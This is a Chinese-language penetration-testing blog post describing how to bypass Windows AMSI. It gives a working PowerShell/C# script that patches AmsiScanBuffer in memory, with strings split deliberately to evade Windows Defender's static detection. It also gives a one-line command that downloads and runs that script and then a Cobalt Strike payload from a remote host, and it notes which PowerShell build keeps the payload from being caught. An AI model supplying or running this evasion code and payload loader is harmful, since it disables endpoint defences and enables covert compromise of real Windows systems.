---
layout: post
title:  "渗透基础-Bypass AMSI"
date:   2019-05-07 17:48:13
categories: 内网渗透
permalink: /archivers/渗透基础-Bypass AMSI
---

##  0x00 简介

---

 这里简单记录一下 Bypass AMSI 的一个方法使用过程，方法来自 @Rasta Mouse。

参考链接：https://rastamouse.me/2018/12/amsiscanbuffer-bypass-part-4/

## 0x01 使用过程

---

###  1. 修改原始bypass AMSI 脚本

作者提供的脚本如下，当然直接使用会被杀软杀掉，我做了少许修改，只要绕过AV 静态检测就可以。

```
$Ref = (
"System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
"System.Runtime.InteropServices, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"
)

$Source = @"
using System;
using System.Runtime.InteropServices;
namespace Bypass
{
    public class AMSI
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);
        public static int Disable()
        {
	    String amsi = "amsi";        //修改位置
	    amsi = amsi + ".dll";
            IntPtr TargetDLL = LoadLibrary(amsi);
            if (TargetDLL == IntPtr.Zero) { return 1; }
            IntPtr ASBPtr = GetProcAddress(TargetDLL, "Am" + "si" + "S" + "can" + "Buffer");   //修改位置
            if (ASBPtr == IntPtr.Zero) { return 1; }
            UIntPtr dwSize = (UIntPtr)5;
            uint Zero = 0;
            if (!VirtualProtect(ASBPtr, dwSize, 0x40, out Zero)) { return 1; }
            Byte[] Patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
IntPtr unmanagedPointer = Marshal.AllocHGlobal(6);
Marshal.Copy(Patch, 0, unmanagedPointer, 6);
MoveMemory(ASBPtr, unmanagedPointer, 6);
            return 0;
        }
    }
}
"@

Add-Type -ReferencedAssemblies $Ref -TypeDefinition $Source -Language CSharp
```



我主要修改了2个地方，"amsi.dll" 和 函数 "AmsiScanBuffer" 字符串上做了拼接，即可绕过Windows Defender.

### 2.载入测试

1.首先起一个Cobalt Strike listener.

2.在Cobalt Strike 起Web Drive，放入 修改后的ps1 脚本。

3.起一个powershell Web Drive .

4.在WIN10上使用powershell  远程下载执行payload。

```
c:\Windows\SysWOW64\windowspowershell\v1.0\powershell.exe -nop -c "iex(new-object net.webclient).downloadstring('http://IP/amsi');if([Bypass.AMSI]::Disable() -eq "0") { iex ((new-object net.webclient).downloadstring('http://IP/a'))}"
```

![](https://raw.githubusercontent.com/xxxxxyyyy/blog_image/master/2019-05/1.jpg)

![](https://raw.githubusercontent.com/xxxxxyyyy/blog_image/master/2019-05/2.jpg)

可以看到成功bypass amsi，并且payload执行成功，这里有个要注意的，必须要使用"c:\Windows\SysWOW64\windowspowershell\v1.0\powershell.exe" 32位的ps来执行，因为cobalt strike生成的payload是32位的，如果你使用64位ps去bypass amsi后，再运行payload，会新生成一个32bit的powershell子进程，并且有全新加载的amsi.dll。所以payload会被杀。
